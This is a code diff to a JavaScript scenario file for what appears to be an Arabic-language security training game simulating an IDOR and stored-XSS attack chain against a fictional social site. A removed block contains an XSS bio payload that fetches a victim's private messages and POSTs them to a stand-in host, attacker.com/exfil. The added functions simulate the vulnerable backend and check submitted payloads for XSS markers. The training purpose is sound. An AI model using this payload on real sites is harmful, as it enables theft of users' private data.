@@ -57,44 +57,6 @@ window.scenario_009 = {
       "workspace": "recon",
       "xpReward": 150,
       "description": "### 🔍 فحص واختبار المسارات يدوياً\n\nسنقوم بالتحقق من مسار الرسائل للتأكد من وجود ثغرة IDOR أولاً.\nاختر الأداة المناسبة لتشغيلها.",
-      "terminalCommands": [
-        {
-          "name": "curl https://social.target.com/api/profile",
-          "correct": false,
-          "output": [
-            {
-              "text": "HTTP/1.1 200 OK",
-              "type": "info"
-            },
-            {
-              "text": "{\"username\": \"attacker\", \"bio\": \"Hello\"}",
-              "type": "out"
-            }
-          ]
-        },
-        {
-          "name": "curl -X GET \"https://social.target.com/api/messages/9999\" -H \"Authorization: Bearer attacker_token\"",
-          "correct": true,
-          "evidence": {
-            "title": "Legacy Messages IDOR Leak",
-            "content": "Status: 200 OK\nMessages: [{\"from\": \"support@target.com\", \"content\": \"Session token: abc123xyz\"}]"
-          },
-          "output": [
-            {
-              "text": "HTTP/1.1 200 OK",
-              "type": "info"
-            },
-            {
-              "text": "{\"user_id\": 9999, \"messages\": [{\"from\": \"admin\", \"content\": \"Session token: abc123xyz\"}]}",
-              "type": "success"
-            },
-            {
-              "text": "[!] Success: Accessed user 9999 private messages without restriction!",
-              "type": "success"
-            }
-          ]
-        }
-      ],
       "aiAdvisor": {
         "hint": "شغّل الطلب الذي يطلب مسار رسائل المستخدم الضحية 9999 لتأكيد ثغرة الـ IDOR.",
         "payloadExplanation": "طلب GET المباشر مع توكين المهاجم يؤكد عدم وجود فحص للصلاحيات.",
@@ -109,18 +71,6 @@ window.scenario_009 = {
       "description": "### 🌐 حقن كود الـ XSS في الملف الشخصي\n\nسنقوم بإرسال طلب تحديث الـ Bio وحقن كود JavaScript يسرق رسائل الضحية التي يزور ملف المهاجم.\nاضغط على **Inject XSS Chain** لمشاهدة الرد.",
       "burpRequest": "POST /api/profile/update HTTP/1.1\nHost: social.target.com\nContent-Type: application/json\nAuthorization: Bearer attacker_token\n\n{\n  \"bio\": \"Normal bio text\"\n}",
       "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"bio\": \"Normal bio text\"\n}",
-      "burpActions": [
-        {
-          "name": "Inject XSS Chain",
-          "correct": true,
-          "modifiedRequest": "POST /api/profile/update HTTP/1.1\nHost: social.target.com\nContent-Type: application/json\n\n{\n  \"bio\": \"<img src=x onerror=\\\"fetch('/api/messages/9999').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))\\\">\"\n}",
-          "modifiedResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"bio\": \"<img src=x onerror=...\"\n}",
-          "evidence": {
-            "title": "Bio XSS Payload Active",
-            "content": "Stored XSS payload injected into bio successfully"
-          }
-        }
-      ],
       "aiAdvisor": {
         "hint": "اضغط على زر Inject XSS Chain لحقن الكود في الـ Bio وتأكيد الثغرة.",
         "payloadExplanation": "حقن كود الاستدعاء داخل الـ onerror لتنفيذه تلقائياً عند تحميل الصورة التالفة.",
@@ -207,5 +157,80 @@ window.scenario_009 = {
       "chain",
       "takeover"
     ]
+  },
+  simulateTerminal(command) {
+    const cmd = command.trim();
+    if (cmd.includes("/api/messages/") && cmd.includes("9999")) {
+      return {
+        output: [
+          { text: "HTTP/1.1 200 OK", type: "info" },
+          { text: '{"user_id": 9999, "messages": [{"from": "admin", "content": "Session token: abc123xyz"}]}', type: "success" },
+          { text: "[!] Success: Accessed user 9999 private messages without restriction!", type: "success" }
+        ],
+        correct: true,
+        evidence: { title: "Legacy Messages IDOR Leak", content: "Status: 200 OK\nMessages: [{\"from\": \"support@target.com\", \"content\": \"Session token: abc123xyz\"}]" },
+        outcome: "تم التحقق من ثغرة IDOR بنجاح! يمكننا قراءة رسائل المستخدمين الآخرين."
+      };
+    } else {
+      return {
+        output: [
+          { text: `Executing: ${cmd}`, type: "info" },
+          { text: "HTTP/1.1 401 Unauthorized or 404 Not Found", type: "error" }
+        ],
+        correct: false,
+        outcome: "حاول قراءة رسائل الضحية 9999 عبر مسار /api/messages/9999 باستخدام curl."
+      };
+    }
+  },
+
+  simulateBackend(requestText, bodyJson) {
+    const parsed = window.HttpRequestParser.parse(requestText);
+    const builder = new window.HttpResponseBuilder();
+
+    if (parsed.method === 'POST' && parsed.path.includes('/api/profile/update')) {
+      let extractedBody = bodyJson;
+      if (!extractedBody) {
+        try {
+          const bodyStart = requestText.indexOf('{');
+          if (bodyStart !== -1) extractedBody = JSON.parse(requestText.substring(bodyStart).trim());
+        } catch (e) {}
+      }
+
+      if (!extractedBody || !extractedBody.bio) {
+        return builder.setStatus(400).setBody({ error: "Missing bio" }).build();
+      }
+
+      const bio = extractedBody.bio;
+      
+      const hasFetch = bio.includes("fetch") || bio.includes("XMLHttpRequest");
+      const hasMessagesEndpoint = bio.includes("/api/messages/");
+      const hasXssTags = /<script|onerror=|onload=/i.test(bio);
+
+      if (hasXssTags && hasFetch && hasMessagesEndpoint) {
+        return builder
+          .setStatus(200)
+          .setBody({ status: "success", bio: bio })
+          .setCorrect(true)
+          .setEvidence("Bio XSS Payload Active", "Stored XSS payload injected into bio successfully")
+          .setObservabilityLog("[CRITICAL] Bio updated with un-sanitized HTML and JavaScript.\n[INFO] Simulated victim visited the profile.\n[INFO] Payload executed and exfiltrated private messages via IDOR!")
+          .setOutcome("تم التحديث بنجاح! قام كود الـ XSS المخزن بالعمل عند زيارة الضحية للملف، وقام بسحب رسائله الخاصة عبر ثغرة IDOR وإرسالها لخادمك. لقد أتممت الـ Chain Bug بنجاح!")
+          .build();
+      } else if (hasXssTags) {
+        return builder
+          .setStatus(200)
+          .setBody({ status: "success", bio: bio })
+          .setObservabilityLog("[WARN] Bio updated with un-sanitized HTML.")
+          .setOutcome("تم حقن كود XSS، لكن الكود لا يقوم باستغلال ثغرة IDOR لسرقة الرسائل! حاول استخدام fetch لطلب /api/messages/9999.")
+          .build();
+      }
+
+      return builder
+        .setStatus(200)
+        .setBody({ status: "success", bio: bio })
+        .setOutcome("تم تحديث الـ Bio ولكن لا يوجد كود XSS تفاعلي. حاول استخدام <img src=x onerror=...>")
+        .build();
+    }
+
+    return builder.setStatus(404).setBody({ error: "Not Found" }).build();
   }
 };
